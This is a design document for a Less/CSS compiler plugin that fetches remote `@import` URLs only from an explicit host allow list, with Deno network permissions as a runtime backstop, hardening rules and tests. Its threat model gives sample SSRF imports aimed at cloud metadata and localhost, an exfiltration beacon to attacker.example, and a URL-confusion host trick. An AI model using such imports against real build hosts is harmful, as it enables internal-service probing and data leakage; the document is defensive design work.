# Remote (network) imports behind an explicit, runtime-enforced allowlist

> **Built.** `@jesscss/plugin-remote-import` (`packages/jess-plugin-remote-import`)
> fetches `@import "https://host/x.less"` from an explicit host allow list. It is
> opt-in: without it a URL import is a CSS terminal and nothing is fetched. The
> design was proposed in jesscss/jess#219; the owner's rulings on its open
> questions (2026-10-04) and the orchestrator judgments made under the owner's
> delegation (2026-10-05) are folded in below and listed in §8.

Related code: `packages/core/src/plugin.ts` (the `canResolveImport → resolve →
locate → getSource` contract), `packages/core/src/context.ts` (`loadImport`,
`_getPath`, `getTree`), `packages/jess-plugin-remote-import/src/index.ts`.

## 0. The idea in one line

A remote import is enabled only when the caller names the exact hosts it trusts,
and on Deno that trust is also enforced by the **runtime network permission** —
so a buggy resolver still cannot reach a host the caller didn't allow.

## 1. Why this is a policy question, not just a feature

Fetching an `@import` URL turns the compiler into an HTTP client that runs
wherever the build runs — a laptop, CI, a server rendering user-supplied Less.
The failure modes are the standard ones for "server fetches a URL":

- **SSRF**: `@import "http://169.254.169.254/latest/meta-data/..."` or
  `http://localhost:6379/` reaches cloud metadata / internal services from the
  build host.
- **Exfiltration / tracking**: `@import "https://attacker.example/beacon.less"`
  phones home with whatever is in the request (and the build's egress IP).
- **Supply-chain**: a trusted CDN host that later serves malicious content, or a
  redirect from a trusted host to an untrusted one.

So the default is **off**, and "on" is never "fetch anything" — it is "fetch
from *these* hosts."

## 2. Default and opt-in surface

**Default: no network.** No plugin in the default stack claims a URL import, so
— per the `canResolveImport` contract in `plugin.ts` — it stays a CSS terminal.
`@jesscss/plugin-less` used to claim `https://cdn.jsdelivr.net/npm/<pkg>/…`
imports and answer them from a locally installed `<pkg>`; that substitution was
removed with this plugin, so the default stack claims no URL at all and a
jsDelivr URL is a terminal like any other.

**Opt-in:** add the plugin with an allow list through the existing
`compile.plugins` option — in a `styles.config.*` file (read by the `jess` CLI,
the `Compiler` API and the Less wrapper alike), the `Compiler` constructor, or
the `jess` CLI's `--allow-remote-imports <hosts>` flag:

```js
// styles.config.mjs
import { remoteImportPlugin } from '@jesscss/plugin-remote-import';

export default {
  compile: {
    plugins: [
      remoteImportPlugin({
        allow: ['cdn.example.com', 'design-tokens.example.com'],
        // defaults: maxBytes 512 KiB, timeout 5000 ms
      })
    ]
  }
};
```

```sh
jess entry.less --allow-remote-imports cdn.example.com,design-tokens.example.com
```

The flag takes a comma-separated list and may repeat; it adds the plugin as
`compile.plugins` would, replacing one configured in a `styles.config.*`. It
needs `@jesscss/plugin-remote-import` installed beside `jess` (an optional peer
dependency) and says so when it is missing. `lessc` gets its own flag separately,
in the Less repository.

An empty or absent `allow` is a hard error at construction. Each entry is a
bare host name spelled as a URL prints it (lowercase, punycode for an IDN): no
wildcard (`*` is rejected), no scheme, port, path or credentials, and never an
IP address (§5).

## 3. Where it slots into the engine

The plugin implements the existing import capabilities (`plugin.ts`), the same
shape as `plugin-node-modules`:

| Capability | Behavior |
| --- | --- |
| `canResolveImport(specifier, …, mustLoad)` | `false` for anything that is not an `http:`/`https:`/protocol-relative URL. For such a URL, `true` when it is `https:` and its host is on `allow`. Otherwise — not fetched — it is `false` (a CSS terminal) for an extensionless URL that may stay CSS, and **throws** for one that has an extension or must load (§6). No request is made. |
| `resolve` / `expandImport` | Not implemented: a URL passes through unchanged. Core never expands a URL into `.less`/`_partial` candidates — expansion is filesystem probing, and a URL names exactly one resource — and the filesystem `locate` skips URL candidates. |
| `locate` | Returns the first candidate that is an allowed `https:` URL (protocol-relative normalized to `https:`). Never a request. |
| `getSource(url)` | The **only** method that touches the network (§5). Context asks the plugin whose `locate` returned the path, so a filesystem plugin's `getSource` is never handed a URL. |

Core passes `mustLoad` to every claim: true for an import with no CSS meaning —
`(inline)`, `(reference)`, `(less)`, `@-import`, `@compose` — which can never be
left a CSS `@import` (`ImportOptions.mustLoad`, set by the serializer's
`importThroughContext`; `readInlineImport` always sets it). Because
`canResolveImport` gates entry to the pipeline, a host off the list is left CSS
or rejected *before* resolve/locate/getSource — the fetch code is never reached
for a disallowed host. That is the app-level check. §4 is what makes it hold on
Deno even if the app-level check is wrong.

Three core rules make the route sound for documents that were themselves
fetched:

- **Every path a remote document names is relative to its URL.** Context's
  `_getPath` — the one resolver every route goes through: `@import`,
  `@import (inline)`, `data-uri()`/`image-size()`, `@use`, `@plugin` — rebases a
  non-URL path written in a remote document onto the document's URL
  (`new URL(path, documentUrl)`) before anything else. So `@import "vars.less"`
  in `https://cdn.example.com/theme/main.less` asks for
  `https://cdn.example.com/theme/vars.less` and passes the same allow list, and a
  remote document can never reach a local file: `/etc/x.less` in it is
  `https://cdn.example.com/etc/x.less`. A path that does not resolve onto the
  document's own host (`C:/x.less`, which the URL parser reads as a one-letter
  scheme) is an error.
- **A located URL is read only by the plugin that located it.** `@import` and
  `@import (inline)` read it through that plugin's `getSource` (an `(inline)`
  URL passes the same claim gate first). `data-uri()` and `image-size()` read
  local bytes only, as in Less 4.x: a path that locates to a URL is reported
  missing, so `data-uri()` keeps its `url()` fallback and nothing is fetched.
  `@use` and `@plugin` load modules — code or data the runtime loads — from
  local files only: a URL is an error with no request, whether it is written,
  rebased from a remote document, or located by a plugin, and whether or not
  the remote-import plugin is configured.
- **A URL keeps its query.** The query is part of which resource a server
  returns (`theme.less?v=2`), so it stays in the source identity and the
  request; only the `#fragment` is dropped. A file path still drops both. A URL
  without an extension is parsed in the importing document's language.

`@compose` of a URL reaches the same `loadImport` route as `@import`, so it
passes the same claim gate and allow list. It has no CSS meaning, so it always
loads: off the list it is an error, extensionless included. `@use` of a URL is
refused (above).

**URL rewriting.** `rewriteUrls` and `rootpath` apply inside a fetched document
exactly as inside a local import (`packages/syntax/less/jess-plugin-less`,
`transformUrl`). With `rewriteUrls` off, a relative `url()` keeps its text and
takes the `rootpath` prefix. When `rewriteUrls` rewrites it (`all`, or `local`
for `./`/`../` paths), it is rebased onto the document's URL —
`url(img/a.png)` in `https://cdn.example.com/theme/main.less` becomes
`url(https://cdn.example.com/theme/img/a.png)` — the remote counterpart of
prefixing a local import's directory. The result is absolute, so `rootpath` has
nothing to prefix. Only the leading `./`/`../` segments are resolved as a URL,
clamped at the host's root; the rest keeps its authored text, escapes included.
A CSS `@import` written in the document is rewritten the same way.

## 4. The enforcement boundary — Deno `--allow-net`

App-level host checks are necessary but not sufficient: a bug in our own
normalization (parsing `https://cdn.example.com@evil.example/…`, an
unnormalized IDN, a redirect we forgot to re-check) could route a fetch to a
host the caller never allowed. The runtime permission is the backstop that
holds even when our code is wrong.

- **Deno**: run with `--allow-net=<the same hosts>`. `fetch()` to any other host
  fails with the runtime's capability error (`Deno.errors.NotCapable` in Deno 2;
  `PermissionDenied` before it) before a socket opens, and Deno's own DNS lookup
  is permission-checked too (it fails with `EPERM`). A redirect that Deno follows
  itself is re-checked per hop.
- **Node**: Node has no stable per-host network permission. On Node the allow
  list is enforced **only** at the app level (§3, §5). **Node gives you the
  allow list; Deno gives you the allow list *and* a runtime guarantee.**

The plugin does not grant itself permission and does not launch Deno; whoever
runs the compiler under Deno passes `--allow-net` with the same list as `allow`.
The two lists are tied fail-closed in both directions the plugin can observe:

- If a host is in `allow` but not in `--allow-net`, the fetch is denied.
- If Deno was started with **unrestricted** network access (`--allow-net` with
  no host list, or `-A`), nothing at runtime backs the allow list, so the
  plugin's constructor throws, naming the `--allow-net=<allow>` to use. It asks
  `Deno.permissions.querySync({ name: 'net' })`, which reports `granted` only for
  unrestricted access.

A host granted by `--allow-net` but absent from `allow` cannot be detected (Deno
offers no way to list its grants); the app-level check still refuses it.

## 5. Hardening applied to every allowed fetch

- **https only.** An `http:` URL is refused, even on an allowed host.
- **No cross-host redirects.** Redirects are followed by the plugin
  (`redirect: 'manual'`), at most five, and only while the origin (scheme, host
  and port) stays the same. A redirect to another origin — including another
  allowed host, plain `http:`, or another port — is refused without a request.
- **IP-literal hosts are never fetched.** An allow entry that is an IP address,
  public or not, is rejected at construction, with no opt-in, so a URL whose
  host is an IP literal is always off the list (§6).
- **Private addresses are never reached.** The default transport resolves an
  allowed hostname before the request and refuses it when any answer is a
  private, loopback, link-local, shared (CGNAT), unspecified, benchmarking,
  multicast or reserved address (`0/8`, `10/8`, `100.64/10`, `127/8`,
  `169.254/16`, `172.16/12`, `192.168/16`, `198.18/15`, `224/4`, `240/4` —
  broadcast included —, `fc00::/7`, `fe80::/10`, `fec0::/10`, `ff00::/8`, and
  every IPv6 form that embeds an IPv4 address: IPv4-mapped, IPv4-compatible
  `::/96` — `::` and `::1` included —, NAT64 `64:ff9b::/96` and 6to4
  `2002::/16`, each checked by the IPv4 address inside it). That check runs
  before `fetch` connects, so a DNS answer that changes in between (rebinding)
  is not caught; pinning the socket to the checked address needs a custom
  dispatcher.
- **Size and time caps.** `maxBytes` (default 512 KiB) refuses a declared
  `Content-Length` over the cap and aborts a streamed body that passes it.
  `timeout` (default 5000 ms) bounds the whole import — every redirect and the
  body. The plugin cancels the body itself at the deadline, so a body that
  stalls after its headers is bounded whatever transport produced it. The body
  of a redirect or a failed response is released before the next hop or the
  error.
- **Transport.** `fetch` is injectable (`(url, { redirect, signal }) =>
  Promise<Response>`). A replacement takes over the request *and* the resolved
  address check; the allow list, https, redirect, size and time rules stay with
  the plugin.
- **Caching.** Each URL is fetched once per compile (Context caches imports by
  identity). There is no lockfile or integrity pinning — a known v1 limitation
  (§8, item 4).
- **`insecure`.** The Less 4.x option that skipped certificate checks is
  accepted and has no effect: remote imports are https-only and always verify
  the certificate. Setting it reports a `deprecation/insecure-option` warning
  (`packages/compiler/src/index.ts`).

## 6. Which URL imports are fetched, left CSS, or refused

The allow list says which hosts are **fetched and inlined**, not which a
stylesheet may reference. With the plugin configured, a URL import is decided
in this order:

1. **Less classifies it first.** A URL Less treats as a CSS import — a `.css`
   path, `(css)` — is a CSS terminal the parser already made an `@import`
   at-rule; it never reaches the plugin and is never fetched, on or off the
   list.
2. **Fetched:** an `https:` URL on the allow list.
3. **Left a CSS `@import`:** an extensionless URL that is not fetched (off the
   list, an IP-literal host, or plain `http:`) and may stay CSS — Google Fonts'
   `https://fonts.googleapis.com/css?family=…`. Nothing is fetched; the browser
   loads it.
4. **Refused:** anything else that is not fetched — a URL with an extension
   (`.less`, or any other: Less would inline it), or one that must load
   (`(inline)`, `(reference)`, `(less)`, `@-import`, `@compose`) — is a compile
   error (`import/load-failed`, "… is not on the remote-import allow list", "…
   is an IP address …", or "… https-only"). It cannot be a CSS terminal, so it
   is a mistake to report. `(optional)` does not suppress it — `optional`
   covers a missing file, not a refused one.

Without the plugin, a URL import is a CSS terminal, as before.

A media query on a compile-time `@import` is desugared at parse time into an
`@media` block around the import (ledger A10), so an extensionless URL left CSS
with a media query emits `@media q { @import "…"; }`, which browsers ignore.
Mark such an import `(css)` to get `@import "…" q;`. Whether the desugared form
should collapse back when the import stays CSS is open (§8).

A file the server reports missing — HTTP 404 or 410 — is `import/not-found`,
so `(optional)` skips it exactly as it skips a missing local file. Any other
failed response is `import/load-failed`.

## 7. The proof: a test that shows Deno *denies* an off-list host

`packages/jess-plugin-remote-import/test/deno-net-denial.test.ts` runs
`test/deno/net-denial.ts` under `deno run --allow-net=allowed.invalid,127.0.0.1`.
In that script the plugin's own allow list admits **both** `allowed.invalid`
and `denied.invalid`, so the app-level check is out of the way, and:

- with Deno's raw `fetch` as the transport (no DNS guard either), a fetch of
  `https://denied.invalid/…` fails with the runtime's capability error — the
  error identity is checked, not our message;
- the same through the shipped default transport fails at Deno's
  permission-checked DNS lookup;
- `https://allowed.invalid/…` gets past the runtime (it fails only because
  `.invalid` never resolves) — the positive control showing the denial is per
  host, not a blanket network ban;
- a loopback server answering `302 → https://denied.invalid/…` makes a
  runtime-followed redirect fail at the hop.

Without the plugin's own guard, an unrestricted `--allow-net` would let the
first probe reach the network and fail the test; that is what makes it a proof.
The same script run under an unrestricted `--allow-net` proves the guard (§4):
the plugin's constructor refuses to start, and no probe runs. Deno is found on
`PATH` first, then the binary of the `deno` devDependency (the order
`@jesscss/plugin-js` uses); the tests are skipped, with that reason, only when
neither runs.

The Node side — the claim (fetched, left CSS for an extensionless URL, refused
for one with an extension or that must load), https-only, IP-literal hosts,
same- and cross-origin redirects, redirect limit, 404/410 as not-found,
releasing unread bodies, size cap (declared and streamed), timeout (before the
headers and in a stalled body), IP allow entries, the Deno unrestricted-net
guard, and an allowed hostname resolving into each private range (embedded IPv4
included) — is covered by `test/remote-import.test.ts` with an injected
transport and an injected DNS answer; no test makes a real network request.

End to end through the `Compiler`, `packages/jess/test/remote-imports.test.ts`
covers the opt-in default, the claim and allow list, CSS-classified URLs never
fetched, extensionless URLs off the list left CSS (Google Fonts), every
must-load form refused off the list, `@compose` of a URL, `(optional)` over a
404, `(inline)` and `data-uri()` of a URL, the `@use` refusal with and without
the plugin, `rewriteUrls`/`rootpath` inside a fetched document, and a remote
document naming a real local file by absolute path through each of `@import`,
`@import (inline)`, `data-uri()`, `@use` and `@plugin` — the file's contents
never reach the output. `packages/core/src/ast/__tests__/import-at-rule.test.ts`
pins which imports reach the claim with `mustLoad`;
`packages/jess/test/cli.test.ts` covers `--allow-remote-imports`; and
`packages/jess/test/config-merge.test.ts` the `insecure` warning.

The Less corpus fixture `tests-unit/import/import-remote.less` is a gate: the
all-less harness configures the plugin with `allow: ['cdn.jsdelivr.net']` and a
transport that answers `https://cdn.jsdelivr.net/npm/@less/test-data/<file>`
from the local checkout. It proves remote `(reference)` imports (a query
included) render like 4.x through the real claim → locate → fetch → parse
route; it proves nothing about network I/O, which the tests above own.

## 8. Rulings and open questions

Owner rulings, 2026-10-04 (applied above):

1. **Blocked host** when the plugin is configured: **error** (§6) — refined by
   item 7 below: the error is for an import that cannot stay CSS.
2. **IP hosts**: private, loopback and link-local addresses are **denied** (§5)
   — extended by item 8 below to every IP literal.
3. **https only**; **no cross-host redirects**; **size and time caps** with
   defaults of 512 KiB and 5 s (§5).

Orchestrator judgment 2026-10-05 under owner delegation ("most correct / most
like CSS / best UX"; applied above):

4. **Reproducibility**: a lockfile / SRI-style integrity, or content-addressed
   caching, is **deferred past v1** and documented as a known limitation (§5).
5. **CLI**: the `jess` CLI takes `--allow-remote-imports <hosts>` (§2). The
   `lessc` flag is separate work in the Less repository; the Less wrapper's
   `plugins` option still takes Less 4.x plugins only.
6. **Module imports over the network.** `@use` (and `@plugin`) of a URL is
   **refused** — the compiler never executes network code — with or without the
   plugin (§3). `@compose` of a URL **follows the `@import` policy** (§3, §6).
7. **Extensionless URLs on an off-list host.** The allow list says which hosts
   are fetched and inlined, not which may be referenced. Classification follows
   Less's import rules first, so a CSS-classified URL is never fetched; an
   import that must be inlined but is not fetched is an error; an extensionless
   URL that is not fetched stays a CSS terminal — the Google Fonts case — and on
   an allowed host it is fetched and parsed in the importing file's language
   (§6). This replaces the earlier "every http(s) URL is claimed; a blocked host
   is an error" behaviour.
8. **IP-literal hosts** are **denied in v1, with no opt-in** (§5).
9. **Less `insecure`** is accepted with a warning that it has no effect (§5).
10. **URL rewriting**: `rewriteUrls`/`rootpath` apply inside a fetched document
    exactly as for local imports, with `url()` values rebased onto the
    document's URL (§3).

Still open for the owner:

11. **A media-tailed import left CSS.** The parse-time desugar of a media query
    on a compile-time `@import` (ledger A10) wraps the import in `@media`, so
    when the import stays a CSS terminal — no plugin, or an extensionless URL off
    the list — the output is `@media q { @import "…"; }`, which browsers ignore.
    `(css)` avoids it. Options: collapse the wrapper back to `@import "…" q;`
    when its sole import stays CSS (needs a desugar marker, since an authored
    `@media q { @import "…"; }` has the same shape), or keep the media tail
    typed on the import for URL targets.
